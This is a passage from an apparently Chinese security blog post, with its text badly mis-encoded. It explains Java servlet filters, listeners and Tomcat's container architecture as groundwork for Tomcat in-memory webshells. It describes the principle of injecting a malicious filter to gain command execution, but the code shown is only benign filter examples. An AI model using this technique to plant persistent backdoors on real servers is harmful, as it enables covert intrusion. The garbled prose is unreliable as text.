class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletResponse</span><span class="p">)</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HttpSession</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">session</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">resp</span><span class="p">.</span><span class="na">sendRedirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getContextPath</span><span class="p">()</span><span class="o">+</span><span class="s">&#34;/login.jsp&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&#34;username&#34;</span><span class="p">).</span><span class="na">toString</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="s">&#34;admin&#34;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">username</span><span class="p">)){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="k">else</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">resp</span><span class="p">.</span><span class="na">sendRedirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getContextPath</span><span class="p">()</span><span class="o">+</span><span class="s">&#34;/login.jsp&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šè¿°ä»£ç å®ç°äº†å½“è®¿é—®<code>/admin</code>è·¯ç”±æ—¶ï¼Œä¼šå¯¹èº«ä»½è¿›è¡Œåˆ¤æ–­ä»è€Œå†³å®šæ˜¯å¦æ”¾è¡Œä»è€Œè°ƒç”¨åˆ°servletã€‚</p>
<h6 id="filteré“¾">Filteré“¾
</h6><p>å½“å¤šä¸ª Filter åŒæ—¶å­˜åœ¨çš„æ—¶å€™ï¼Œç»„æˆäº†Filteré“¾ã€‚WebæœåŠ¡å™¨æ ¹æ®Filter åœ¨web.xmlæ–‡ä»¶ä¸­çš„æ³¨å†Œé¡ºåºï¼Œå†³å®šå…ˆè°ƒç”¨å“ªä¸ª Filterã€‚</p>
<p>å½“ç¬¬ä¸€ä¸ª Filter çš„ doFilter æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼ŒwebæœåŠ¡å™¨ä¼šåˆ›å»ºä¸€ä¸ªä»£è¡¨ Filter é“¾çš„ FilterChain å¯¹è±¡ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œé€šè¿‡åˆ¤æ–­ FilterChain ä¸­æ˜¯å¦è¿˜æœ‰ Filter å†³å®šåé¢æ˜¯å¦è¿˜è°ƒç”¨ Filterã€‚</p>
<p>å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055875.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240830191234784"
	
	
></p>
<h5 id="listener">Listener
</h5><p>Java Web å¼€å‘ä¸­çš„ç›‘å¬å™¨ï¼ˆListenerï¼‰å°±æ˜¯Applicationã€Session å’Œ Request ä¸‰å¤§å¯¹è±¡åˆ›å»ºã€é”€æ¯æˆ–è€…å¾€å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§æ—¶è‡ªåŠ¨æ‰§è¡Œä»£ç çš„åŠŸèƒ½ç»„ä»¶ã€‚</p>
<p>æœ‰å¦‚ä¸‹ç›‘å¬å™¨ï¼š</p>
<ul>
<li>ServletContextListennerï¼šå¯¹Servletä¸Šä¸‹æ–‡çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬</li>
<li>ServletContextAttributeListenerï¼šç›‘å¬ Servlet ä¸Šä¸‹æ–‡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢</li>
<li>HttpSessionListenerï¼šå¯¹Session çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ã€‚Sessioné”€æ¯æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ä¸ªæ˜¯Session è¶…æ—¶ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡è°ƒç”¨ Session å¯¹è±¡çš„ invalidate() æ–¹æ³•ä½¿ session å¤±æ•ˆã€‚</li>
<li>HttpSessionAttributeListenerï¼šå¯¹Sessionå¯¹è±¡ä¸­å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ï¼›</li>
<li>ServletRequestListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡çš„åˆå§‹åŒ–å’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼›</li>
<li>ServletRequestAttributeListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ã€‚</li>
</ul>
<p>ç”¨é€”ï¼š
å¯ä»¥ä½¿ç”¨ç›‘å¬å™¨ç›‘å¬å®¢æˆ·ç«¯çš„è¯·æ±‚ã€æœåŠ¡ç«¯çš„æ“ä½œç­‰ã€‚é€šè¿‡ç›‘å¬å™¨ï¼Œå¯ä»¥è‡ªåŠ¨è§¦å‘ä¸€äº›åŠ¨ä½œï¼Œæ¯”å¦‚ç›‘å¬åœ¨çº¿çš„ç”¨æˆ·æ•°é‡ï¼Œç»Ÿè®¡ç½‘ç«™è®¿é—®é‡ã€ç½‘ç«™è®¿é—®ç›‘æ§ç­‰ã€‚</p>
<h4 id="tomcatæ¶æ„">Tomcatæ¶æ„
</h4><h5 id="tomcatè¯´æ˜">Tomcatè¯´æ˜
</h5><p>ä¸ApacheæœåŠ¡å™¨å¯¹æ¯”ä¸€ä¸‹ï¼š</p>
<ul>
<li>Apacheæ˜¯webæœåŠ¡å™¨ï¼ˆé™æ€è§£æï¼Œå¦‚HTMLï¼‰</li>
<li>tomcat æ˜¯javaåº”ç”¨æœåŠ¡å™¨ï¼ˆåŠ¨æ€è§£æï¼Œå¦‚JSPï¼‰</li>
</ul>
<p>è€Œ<u>Tomcatåªæ˜¯ä¸€ä¸ª servletå®¹å™¨</u>ï¼Œä¹Ÿå°±æ˜¯è¯´<strong>Servletæ˜¯ä¸€ç§æŠ€æœ¯å’Œè§„èŒƒï¼Œè€ŒTomcatæ˜¯å®ç°äº†Servletè§„èŒƒçš„å…·ä½“å®¹å™¨ã€‚</strong></p>
<p>Apacheæ˜¯å¯ä»¥å’ŒTomcatè¿é€šçš„ï¼ŒApacheå¯ä»¥ä½œä¸ºwebæœåŠ¡å™¨çš„å‰ç«¯ï¼Œä¹Ÿå°±æ˜¯å½“å®¢æˆ·ç«¯è¯·æ±‚çš„æ˜¯é™æ€é¡µé¢ï¼Œåˆ™åªéœ€è¦ApacheæœåŠ¡å™¨å“åº”è¯·æ±‚ï¼Œå¦‚æœæ˜¯<strong>åŠ¨æ€</strong>çš„ï¼Œåˆ™æ˜¯Tomcatå“åº”è¯·æ±‚åå°†è§£æçš„JSPä»£ç ä¼ å›ç»™Apacheå†ä¼ å›ç»™å‰ç«¯ã€‚</p>
<p>æ‰€ä»¥tomcatæœåŠ¡å™¨æ˜¯å¯ä»¥ç‹¬ç«‹è¿è¡Œä¹Ÿå¯ä»¥å’ŒApacheè¿é€šè¿è¡Œã€‚</p>
<h5 id="tomcatæ¶æ„åŸç†">Tomcatæ¶æ„åŸç†
</h5><p>tomcatæ¡†æ¶å¦‚ä¸‹æ‰€ç¤ºï¼Œä¸»è¦æœ‰serverã€serviceã€connectorã€container å››ä¸ªéƒ¨åˆ†ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055021.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240830194749991"
	
	
></p>
<p>æ ¸å¿ƒéƒ¨ä»¶å°±æ˜¯Connectorå’ŒContainerã€‚</p>
<ul>
<li>
<p><strong>Connector</strong> ä¸»è¦è´Ÿè´£è¿›è¡ŒSocket é€šä¿¡ï¼ˆåŸºäºTCP/IPï¼‰ï¼Œç”¨äºè§£æHTTPæŠ¥æ–‡</p>
</li>
<li>
<p><strong>Container</strong> åˆ™æ˜¯å¤„ç† Connector å‘æ¥çš„è¯·æ±‚ï¼Œå¤„ç†å†…éƒ¨äº‹åŠ¡ï¼ŒåŠ è½½å’Œç®¡ç†Servletï¼Œç”±Servlet å…·ä½“è´Ÿè´£å¤„ç† Request è¯·æ±‚ã€‚</p>
</li>
</ul>
<p>ä¸‹é¢æ¥ç¨æ·±å…¥å­¦ä¹ ä¸€ä¸‹è¿™äº›ç»„ä»¶ã€‚</p>
<h5 id="server">server
</h5><p>å³æ•´ä¸ªTomcat æœåŠ¡å™¨ï¼Œä¸€ä¸ªtomcatåªæœ‰ä¸€ä¸ªServerï¼Œç”¨äºæä¾›å…·ä½“æœåŠ¡</p>
<h5 id="service">service
</h5><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸€ä¸ªTomcat serverå¯ä»¥åŒ…å«å¤šä¸ªserviceï¼Œserviceä¸»è¦æ˜¯å…³è”Connector å’Œ Container ï¼ŒåŒæ—¶ä¼šåˆå§‹åŒ–å®ƒä¸‹é¢çš„å…¶ä»–ç»„ä»¶ã€‚</p>
<p>ä¸€ä¸ª Service å¯ä»¥è®¾ç½®å¤šä¸ª Connectorï¼Œä½†æ˜¯åªèƒ½æœ‰ä¸€ä¸ª Container å®¹å™¨ã€‚</p>
<h5 id="connector">Connector
</h5><p>Connectorç”¨äºè¿æ¥Serviceå’ŒContainerï¼Œè§£æå®¢æˆ·ç«¯çš„è¯·æ±‚å°è£…æˆRequestå¯¹è±¡å¹¶è½¬å‘åˆ°Containerï¼Œä»¥åŠè½¬å‘æ¥è‡ªContainerçš„å“åº”ã€‚æ¯ä¸€ç§ä¸åŒçš„Connectoréƒ½å¯ä»¥å¤„ç†ä¸åŒçš„è¯·æ±‚åè®®ï¼ŒåŒ…æ‹¬HTTP/1.1ã€HTTP/2ã€AJPç­‰ç­‰ã€‚</p>
<h5 id="container">Container
</h5><p>è´Ÿè´£å¤„ç†ç”¨æˆ·çš„Servletè¯·æ±‚ï¼Œå®ƒä¸»è¦æœ‰å››ç§å®¹å™¨ï¼Œåˆ†åˆ«æ˜¯Engineã€Hostã€Contextã€Wrapperã€‚</p>
<p>å®ƒä»¬ä¹‹é—´æ˜¯å­˜åœ¨çˆ¶å­å…³ç³»çš„ã€‚</p>
<p>å››ç§å®¹å™¨çš„ä½œç”¨ï¼š</p>
<ul>
<li><strong>Engine</strong> å¯ä»¥çœ‹æˆæ˜¯å®¹å™¨å¯¹å¤–æä¾›åŠŸèƒ½çš„å…¥å£ï¼Œæ¯ä¸ªEngineæ˜¯Hostçš„é›†åˆï¼Œç”¨äºç®¡ç†å„ä¸ªHostï¼Œ<u>Engineçš„å®ç°ç±»ä¸º org.apache.catalina.core.StandardEngine</u>ã€‚</li>
<li><strong>Host</strong> å¯ä»¥çœ‹æˆä¸€ä¸ª<code>è™šæ‹Ÿä¸»æœº</code>ï¼Œä¸€ä¸ªTomcatå¯ä»¥æ”¯æŒå¤šä¸ªè™šæ‹Ÿä¸»æœºã€‚è€Œä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸‹å¯åŒ…å«å¤šä¸ª Contextï¼Œ<u>Hostçš„å®ç°ç±»ä¸º org.apache.catalina.core.StandardHost</u>ã€‚</li>
<li><strong>Context</strong> è¡¨ç¤ºä¸€ä¸ª Web åº”ç”¨ç¨‹åºï¼Œæ¯ä¸€ä¸ªContextéƒ½æœ‰å”¯ä¸€çš„pathï¼Œä¸€ä¸ªWebåº”ç”¨å¯åŒ…å«å¤šä¸ª Wrapperï¼Œ<u>Contextçš„å®ç°ç±»ä¸º org.apache.catalina.core.StandardContext</u>ã€‚</li>
<li><strong>Wrapper</strong> è¡¨ç¤ºä¸€ä¸ªServletï¼Œè´Ÿè´£ç®¡ç†æ•´ä¸ª Servlet çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬è£…è½½ã€åˆå§‹åŒ–ã€èµ„æºå›æ”¶ç­‰ï¼Œ<u>Wrapperçš„å®ç°ç±»ä¸º org.apache.catalina.core.StandardWrapper</u>ã€‚</li>
</ul>
<p>ç”¨ä¸€å¼ å›¾æ¥è¡¨ç¤ºï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055554.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240830200930186"
	
	
></p>
<p>Wrapperç»„ä»¶ä¿å­˜äº†Webåº”ç”¨çš„é…ç½®ä¿¡æ¯ï¼ˆè¿™æ ·çœ‹æ¥å…¶å®å°±æ˜¯Contextå°±æ˜¯å¯¹åº”webappsä¸‹çš„ä¸åŒçš„åº”ç”¨ç¨‹åºï¼Œå…¶å®ç°çš„åŠŸèƒ½ä¸åŒï¼‰ã€‚</p>
<p>å¹¶ä¸”ç»“åˆåˆ°java web ä¸‰å¤§ä»¶æ¥çœ‹ï¼Œåœ¨åˆ°è¾¾Contextåï¼Œå¯ä»¥è¯´listenerå’Œfilterå­˜åœ¨åœ¨contextä¸­ï¼Œè€Œservletå­˜åœ¨äºwrapperä¸­ã€‚</p>
<h3 id="pipelinevalve">pipeline/valve
</h3><p>pipelineä¸­æ–‡æ˜¯æµæ°´çº¿ï¼Œæ¯ä¸ªå®¹å™¨éƒ½æœ‰è‡ªå·±çš„pipelineï¼Œä»£è¡¨ä¸€ä¸ªå®Œæˆä»»åŠ¡çš„ç®¡é“ã€‚æµæ°´çº¿ä¸Šé¢æœ‰å¾ˆå¤šä»»åŠ¡ï¼Œå…·ä½“ä»»åŠ¡æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå°±æ˜¯Valveï¼Œä¸­æ–‡åå­—æ˜¯é˜€ã€‚å…¶ä¸­Pipelineå’ŒValveéƒ½æ˜¯æ¥å£ï¼Œå¯¹äºPipelineæœ‰ä¸€ä¸ªæ ‡å‡†å®ç°StandardPipelineã€‚å¯¹äºValveä¸åŒçš„å®¹å™¨æœ‰å®ƒè‡ªå·±çš„å®ç°ï¼Œæ¯”å¦‚StandardWrapperå®¹å™¨å®ç°çš„StandardWrapperValve</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055525.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831161515027"
	
	
></p>
<h2 id="å†…å­˜é©¬å­¦ä¹ ">å†…å­˜é©¬å­¦ä¹ 
</h2><p>Tomcatå†…å­˜é©¬çš„æ ¸å¿ƒåŸç†å°±æ˜¯åŠ¨æ€åœ°å°†æ¶æ„ç»„ä»¶æ·»åŠ åˆ°æ­£åœ¨è¿è¡Œçš„TomcatæœåŠ¡å™¨ä¸­ã€‚</p>
<p>Servletåœ¨3.0ç‰ˆæœ¬ä¹‹åèƒ½å¤Ÿæ”¯æŒåŠ¨æ€æ³¨å†Œç»„ä»¶ã€‚è€ŒTomcatç›´åˆ°7.xæ‰æ”¯æŒServlet3.0ï¼Œå› æ­¤é€šè¿‡åŠ¨æ€æ·»åŠ æ¶æ„ç»„ä»¶æ³¨å…¥å†…å­˜é©¬çš„æ–¹å¼é€‚åˆTomcat7.xåŠä»¥ä¸Šã€‚</p>
<h4 id="filter-å‹å†…å­˜é©¬">Filter å‹å†…å­˜é©¬
</h4><p>åœ¨å‰é¢æˆ‘ä»¬å­¦ä¹ äº†ä¸‰å¤§ä»¶ä¸­çš„Filterï¼ˆè¿‡æ»¤å™¨ï¼‰ï¼Œwebè¯·æ±‚éƒ½ä¼šç»è¿‡ filter ä¹‹åæ‰ä¼šåˆ° Servlet ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡è‡ªå®šä¹‰è¿‡æ»¤å™¨æ¥åšåˆ°å¯¹ç”¨æˆ·çš„ä¸€äº›è¯·æ±‚è¿›è¡Œæ‹¦æˆªä¿®æ”¹ç­‰æ“ä½œã€‚</p>
<p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬èƒ½<strong>åŠ¨æ€åˆ›å»º ä¸€ä¸ª filter å¹¶ä¸”å°†å…¶æ”¾åœ¨æœ€å‰é¢</strong>ï¼Œæˆ‘ä»¬çš„filter å°±ä¼šæœ€å…ˆæ‰§è¡Œï¼Œè¿™æ ·åªè¦æˆ‘ä»¬<strong>å¾€ filter ä¸­æ·»åŠ æ¶æ„ä»£ç ï¼Œå°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</strong>ã€‚</p>
<h5 id="ç›¸å…³ç±»äº†è§£">ç›¸å…³ç±»äº†è§£
</h5><p>**FilterDefsï¼š**å­˜æ”¾FilterrDefçš„æ•°ç»„ï¼ŒFilterDef ä¸­å­˜å‚¨ç€æˆ‘ä»¬è¿‡æ»¤å™¨åï¼Œè¿‡æ»¤å™¨å®ä¾‹ç­‰åŸºæœ¬ä¿¡æ¯ã€‚</p>
<p><strong>FilterConfigs</strong>ï¼šå­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨ FilterConfig ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ Filterå¯¹è±¡ç­‰ä¿¡æ¯</p>
<p><strong>FilterMaps</strong>ï¼šå­˜æ”¾FilterMapçš„æ•°ç»„ï¼Œåœ¨ FilterMap ä¸­ä¸»è¦å­˜æ”¾äº† FilterName å’Œ å¯¹åº”çš„URLPattern</p>
<p><strong>FilterChain</strong>ï¼šè¿‡æ»¤å™¨é“¾ï¼Œè¯¥å¯¹è±¡ä¸Šçš„ doFilter æ–¹æ³•èƒ½ä¾æ¬¡è°ƒç”¨é“¾ä¸Šçš„ Filter</p>
<p><strong>ApplicationFilterChain</strong>ï¼šè°ƒç”¨è¿‡æ»¤å™¨é“¾</p>
<p><strong>ApplicationFilterConfig</strong>ï¼šè·å–è¿‡æ»¤å™¨</p>
<p><strong>ApplicationFilterFactory</strong>ï¼šç»„è£…è¿‡æ»¤å™¨é“¾</p>
<p><strong>WebXml</strong>ï¼šå­˜æ”¾ web.xml ä¸­å†…å®¹çš„ç±»</p>
<p><strong>ContextConfig</strong>ï¼šWebåº”ç”¨çš„ä¸Šä¸‹æ–‡é…ç½®ç±»</p>
<p><strong>StandardContext</strong>ï¼šContextæ¥å£çš„æ ‡å‡†å®ç°ç±»ï¼Œä¸€ä¸ª Context ä»£è¡¨ä¸€ä¸ª Web åº”ç”¨ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Wrapper</p>
<h5 id="filteré“¾-æµç¨‹åˆ†æ">Filteré“¾ æµç¨‹åˆ†æ
</h5><p>ç¯å¢ƒï¼š</p>
<ul>
<li>Tomcat 9.0.93</li>
</ul>
<p>å…ˆä»¥å®ä¾‹ç®€å•çœ‹çœ‹Filteré“¾çš„æµç¨‹ï¼š
åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ï¼Œå†…å®¹åˆ†åˆ«ä¸ºï¼š</p>
<p>TestFilter.javaï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">filter</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.catalina.core.StandardWrapper</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TestFilter</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Filter</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">FilterConfig</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;ç¬¬ä¸€ä¸ªFilter åˆå§‹åŒ–åˆ›å»º&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">filterChain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;ç¬¬ä¸€ä¸ªFilteræ‰§è¡Œè¿‡æ»¤æ“ä½œ&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span><span class="n">servletResponse</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>TestDemo.javaï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">filter</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TestDemo</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Filter</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">FilterConfig</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;ç¬¬äºŒä¸ªFilter åˆå§‹åŒ–åˆ›å»º&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">filterChain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;ç¬¬äºŒä¸ªFilteræ‰§è¡Œè¿‡æ»¤æ“ä½œ&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span><span class="n">servletResponse</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
